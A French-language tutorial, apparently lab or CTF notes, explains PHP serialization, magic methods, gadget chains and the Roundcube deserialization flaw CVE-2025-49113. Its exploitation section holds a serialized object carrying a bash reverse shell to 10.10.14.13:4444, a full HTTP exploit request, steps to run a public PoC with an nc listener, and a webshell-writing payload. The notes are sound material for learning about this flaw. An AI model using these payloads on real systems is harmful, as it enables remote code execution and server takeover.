# Désérialisation PHP et RCE

## <mark style="color:red;">Désérialisation PHP et RCE</mark>

### 📚 Table des matières

1. Concepts fondamentaux
2. Sérialisation en PHP
3. Vulnérabilité de désérialisation
4. Analyse du CVE-2025-49113 (Roundcube)
5. Exploitation pratique
6. Défenses et mitigation

***

### <mark style="color:blue;">1. Concepts fondamentaux</mark>

#### <mark style="color:green;">Qu'est-ce que la sérialisation ?</mark>

La **sérialisation** est le processus de conversion d'un objet (structure de données) en une chaîne de caractères pour le stocker ou le transmettre. La **désérialisation** est l'opération inverse.

**Analogie** : C'est comme emballer un meuble IKEA (sérialisation) pour le transporter, puis le réassembler (désérialisation).

```php
// Objet PHP
$user = new User();
$user->name = "Alice";
$user->role = "admin";

// Sérialisation
$serialized = serialize($user);
// Résultat : O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";}

// Désérialisation
$user_restored = unserialize($serialized);
```

***

### <mark style="color:blue;">2. Sérialisation en PHP</mark>

#### <mark style="color:green;">Format de sérialisation PHP</mark>

PHP utilise un format spécifique pour la sérialisation :

```
O:4:"User":2:{s:4:"name";s:5:"Alice";s:4:"role";s:5:"admin";}
│ │  │     │  │ │  │     │ │  │     │ │  │     │ │  │
│ │  │     │  │ │  │     │ │  │     │ │  │     │ │  └─ Valeur
│ │  │     │  │ │  │     │ │  │     │ │  │     │ └─── Longueur
│ │  │     │  │ │  │     │ │  │     │ │  └────────── Type (string)
│ │  │     │  │ │  │     │ │  │     │ └───────────── Nom propriété
│ │  │     │  │ │  │     │ │  └─────────────────── Longueur nom
│ │  │     │  │ │  │     │ └────────────────────── Type (string)
│ │  │     │  │ │  └──────────────────────────── Nombre propriétés
│ │  │     │  └────────────────────────────────── Nom de classe
│ │  └───────────────────────────────────────── Longueur nom classe
│ └──────────────────────────────────────────── Type (Object)
```

#### <mark style="color:green;">Types courants en sérialisation PHP</mark>

| Type    | Symbole | Exemple                              |
| ------- | ------- | ------------------------------------ |
| String  | `s`     | `s:5:"hello";`                       |
| Integer | `i`     | `i:42;`                              |
| Boolean | `b`     | `b:1;` (true)                        |
| Array   | `a`     | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
| Object  | `O`     | `O:4:"User":1:{...}`                 |
| Null    | `N`     | `N;`                                 |

#### <mark style="color:green;">Méthodes magiques PHP</mark>

PHP possède des **méthodes magiques** qui s'exécutent automatiquement lors d'événements spécifiques :

```php
class Example {
    // Appelée lors de la création de l'objet
    public function __construct() {
        echo "Objet créé\n";
    }
    
    // Appelée lors de la destruction de l'objet
    public function __destruct() {
        echo "Objet détruit\n";
    }
    
    // Appelée lors de la désérialisation
    public function __wakeup() {
        echo "Objet réveillé après désérialisation\n";
    }
    
    // Appelée quand on convertit l'objet en string
    public function __toString() {
        return "Représentation string de l'objet";
    }
}
```

**⚠️ DANGER** : Ces méthodes s'exécutent automatiquement, ce qui peut être exploité !

***

### <mark style="color:blue;">3. Vulnérabilité de désérialisation</mark>

#### <mark style="color:green;">Pourquoi c'est dangereux ?</mark>

Quand une application utilise `unserialize()` sur des données contrôlées par l'utilisateur, un attaquant peut :

1. **Injecter des objets malveillants**
2. **Déclencher l'exécution de code** via les méthodes magiques
3. **Manipuler la logique applicative**

#### <mark style="color:green;">Exemple simple de vulnérabilité</mark>

```php
<?php
class Logger {
    private $logfile;
    
    public function __destruct() {
        // Écrit dans un fichier lors de la destruction
        file_put_contents($this->logfile, "Log entry");
    }
}

// Code vulnérable
$user_data = $_GET['data'];
$obj = unserialize($user_data);  // ⚠️ DANGEREUX !
?>
```

**Exploitation** :

```php
// Créer un objet malveillant
$exploit = new Logger();
$exploit->logfile = "/var/www/html/shell.php";

// Le sérialiser
$payload = serialize($exploit);
// Résultat : O:6:"Logger":1:{s:14:"Loggerlogfile";s:27:"/var/www/html/shell.php";}

// L'envoyer à la cible
// http://target.com/vulnerable.php?data=O:6:"Logger":1:{...}
```

Quand le serveur désérialise, `__destruct()` s'exécute et écrit dans `shell.php` !

#### <mark style="color:green;">Chaînes de gadgets (Gadget Chains)</mark>

Dans les applications complexes, on utilise des **chaînes de gadgets** : une séquence de méthodes magiques qui s'appellent pour atteindre l'exécution de code.

```
Désérialisation → __wakeup() → __toString() → __call() → system()
```

***

### <mark style="color:blue;">4. Analyse du CVE-2025-49113 (Roundcube)</mark>

#### <mark style="color:green;">Description de la vulnérabilité</mark>

**Roundcube Webmail < 1.5.10 et 1.6.x < 1.6.11** contient une vulnérabilité RCE via désérialisation PHP.

#### <mark style="color:green;">Point d'injection</mark>

Le fichier `program/actions/settings/upload.php` ne valide pas le paramètre `_from` dans l'URL :

```php
// Code vulnérable simplifié
$_from = $_GET['_from'];  // Non validé !
$_SESSION['temp_' . $_from] = $uploaded_data;
```

#### <mark style="color:green;">Vecteur d'attaque</mark>

L'attaquant exploite un **bug de corruption de session** :

1. **Upload d'image** : Utilisé normalement pour les photos de profil
2. **Manipulation de `_from`** : Permet d'injecter dans la session PHP
3. **Injection de données malveillantes** : Via le nom de fichier uploadé
4. **Désérialisation** : Quand le serveur traite les préférences utilisateur

#### <mark style="color:green;">Flux d'exploitation</mark>

```
1. Attaquant authentifié upload une image
   ↓
2. Manipule le paramètre _from dans l'URL
   POST /settings/upload.php?_from=evil_key
   ↓
3. Injecte un objet sérialisé malveillant dans le filename
   Content-Disposition: form-data; name="file"; filename="<?php ...?>"
   ↓
4. Les données sont stockées dans $_SESSION['temp_evil_key']
   ↓
5. Roundcube désérialise la session plus tard
   ↓
6. __destruct() s'exécute → RCE !
```

#### <mark style="color:green;">Pourquoi ça marche ?</mark>

1. **Session PHP** : Stockée sous forme sérialisée sur le disque
2. **Corruption** : En manipulant `_from`, on peut écrire dans la session
3. **Désérialisation automatique** : PHP désérialise automatiquement `$_SESSION`
4. **Méthodes magiques** : `__destruct()` ou `__wakeup()` sont appelées

***

### <mark style="color:blue;">5. Exploitation pratique</mark>

#### <mark style="color:green;">Structure d'un exploit</mark>

```php
<?php
// 1. Définir la classe cible (doit exister sur le serveur)
class rcmail_attachment_handler {
    public $file_path;
    public $command;
    
    public function __destruct() {
        // Code vulnérable qui exécute une commande
        system($this->command);
    }
}

// 2. Créer l'objet malveillant
$exploit = new rcmail_attachment_handler();
$exploit->command = "bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'";

// 3. Sérialiser
$payload = serialize($exploit);
echo $payload;

// 4. Encoder pour l'URL si nécessaire
$encoded = urlencode($payload);
?>
```

#### <mark style="color:green;">Exemple de requête d'exploitation</mark>

```http
POST /settings/upload.php?_from=../../../../../../../../tmp/sess_PHPSESSID HTTP/1.1
Host: roundcube.frizz.htb
Cookie: PHPSESSID=abc123...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

O:26:"rcmail_attachment_handler":2:{s:9:"file_path";s:10:"/tmp/shell";s:7:"command";s:57:"bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'";}
------WebKitFormBoundary--
```

#### <mark style="color:green;">Étapes d'exploitation complètes</mark>

```bash
# 1. Cloner le POC
git clone https://github.com/hakaioffsec/CVE-2025-49113-POC
cd CVE-2025-49113-POC

# 2. Modifier le payload dans exploit.php
# Ajouter votre reverse shell

# 3. Lancer un listener
nc -lvnp 4444

# 4. Exécuter l'exploit
php exploit.php http://roundcube.frizz.htb username password

# 5. Attendre la connexion reverse shell
```

#### <mark style="color:green;">Génération de payload personnalisé</mark>

```php
<?php
// Payload pour créer un webshell
class Evil {
    private $cmd = "<?php system(\$_GET['cmd']); ?>";
    private $file = "/var/www/html/shell.php";
    
    public function __destruct() {
        file_put_contents($this->file, $this->cmd);
    }
}

$payload = serialize(new Evil());
echo base64_encode($payload);
?>
```

***
